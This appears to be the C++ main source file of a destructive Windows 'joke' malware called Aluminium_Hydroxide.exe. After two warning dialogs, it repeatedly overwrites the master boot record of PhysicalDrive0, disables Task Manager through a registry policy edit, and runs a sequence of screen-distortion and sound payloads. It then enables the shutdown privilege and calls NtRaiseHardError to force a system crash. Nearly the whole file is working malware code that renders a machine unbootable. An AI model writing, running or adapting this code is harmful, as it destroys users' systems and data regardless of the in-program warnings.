#include "Shader.h"
#include "Sound.h"
#include "MBR.h"
#include <Windows.h>

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI mbr(LPVOID lpParam) {
	while (true) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}

DWORD WINAPI d(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	return 1;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
	int Messagebox = MessageBoxW(NULL, L"Run Malware?", L"Aluminium_Hydroxide.exe", MB_YESNO | MB_ICONWARNING);
	if (Messagebox == IDYES) {
		int Messagebox2 = MessageBoxW(NULL, L"Are You Sure?\nIt will be destroy your PC\nYour PC will be cooked\nMake sure you run it in a virtual machine.\n If you run it on your real PC, The Creator is not responsibility for any damage!", L"Aluminium_Hydroxide.exe", MB_YESNO
			| MB_ICONWARNING);
		if (Messagebox2 == IDYES) {
			CreateThread(0, 0, mbr, 0, 0, 0);
			CreateThread(0, 0, d, 0, 0, 0);
			Sleep(5000);
			HANDLE Shader1 = CreateThread(NULL, 0, Payload1, NULL, 0, NULL);
			Sound1();
			WaitForSingleObject(Shader1, INFINITE);
			CloseHandle(Shader1);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader2 = CreateThread(NULL, 0, Payload2, NULL, 0, NULL);
			Sound2();
			WaitForSingleObject(Shader2, INFINITE);
			CloseHandle(Shader2);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader3 = CreateThread(NULL, 0, Payload3, NULL, 0, NULL);
			Sound3();
			WaitForSingleObject(Shader3, INFINITE);
			CloseHandle(Shader3);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader4 = CreateThread(NULL, 0, Payload4, NULL, 0, NULL);
			Sound4();
			WaitForSingleObject(Shader4, INFINITE);
			CloseHandle(Shader4);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader5 = CreateThread(NULL, 0, Payload5, NULL, 0, NULL);
			HANDLE Sound_5 = CreateThread(NULL, 0, Sound5, NULL, 0, NULL);
			Sleep(30000);
			StopThread.store(true);
			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);
			HANDLE Shader_5 = CreateThread(NULL, 0, Payload5_5, NULL, 0, NULL);
			WaitForSingleObject(Shader_5, INFINITE);
			WaitForSingleObject(Sound_5, INFINITE);
			WaitForSingleObject(Shader5, INFINITE);
			CloseHandle(Shader5);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader6 = CreateThread(NULL, 0, Payload6, NULL, 0, NULL);
			Sound6();
			WaitForSingleObject(Shader6, INFINITE);
			CloseHandle(Shader6);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			StopThread.store(false);

			HANDLE Shader7 = CreateThread(NULL, 0, Payload7, NULL, 0, NULL);
			Sound7();
			WaitForSingleObject(Shader7, INFINITE);
			CloseHandle(Shader7);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader8 = CreateThread(NULL, 0, Payload8, NULL, 0, NULL);
			Sound8();
			WaitForSingleObject(Shader8, INFINITE);
			CloseHandle(Shader8);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader9 = CreateThread(NULL, 0, Payload9, NULL, 0, NULL);
			Sound9();
			WaitForSingleObject(Shader9, INFINITE);
			CloseHandle(Shader9);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader10 = CreateThread(NULL, 0, Payload10, NULL, 0, NULL);
			Sound10();
			WaitForSingleObject(Shader10, INFINITE);
			CloseHandle(Shader10);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader11 = CreateThread(NULL, 0, Payload11, NULL, 0, NULL);
			Sound11();
			WaitForSingleObject(Shader11, INFINITE);
			CloseHandle(Shader11);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader12 = CreateThread(NULL, 0, Payload12, NULL, 0, NULL);
			Sound12();
			WaitForSingleObject(Shader12, INFINITE);
			CloseHandle(Shader12);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader13 = CreateThread(NULL, 0, Payload13, NULL, 0, NULL);
			Sound13();
			WaitForSingleObject(Shader13, INFINITE);
			CloseHandle(Shader13);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Squares = CreateThread(NULL, 0, squares, NULL, 0, NULL);
			HANDLE Sound_14 = CreateThread(NULL, 0, Sound14, NULL, 0, NULL);
			HANDLE Mashers = CreateThread(NULL, 0, mashers, NULL, 0, NULL);
			Sleep(30000);
			StopThread.store(true);
			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);
			HANDLE Shader14 = CreateThread(NULL, 0, Payload14, NULL, 0, NULL);
			WaitForSingleObject(Shader14, INFINITE);
			WaitForSingleObject(Squares, INFINITE);
			WaitForSingleObject(Sound_14, INFINITE);
			WaitForSingleObject(Mashers, INFINITE);
			CloseHandle(Shader14);
			CloseHandle(Sound_14);
			CloseHandle(Squares);
			CloseHandle(Mashers);

			SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0, SMTO_ABORTIFHUNG, 200, NULL);
			Sleep(100);

			HANDLE Shader15 = CreateThread(NULL, 0, Payload15, NULL, 0, NULL);
			Sound15();
			WaitForSingleObject(Shader15, INFINITE);
			CloseHandle(Shader15);

			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);
			Sleep(-1);
		}

		else {
			exit(0);
		}
	}
	else {
		exit(0);
	}

	return 0;
}
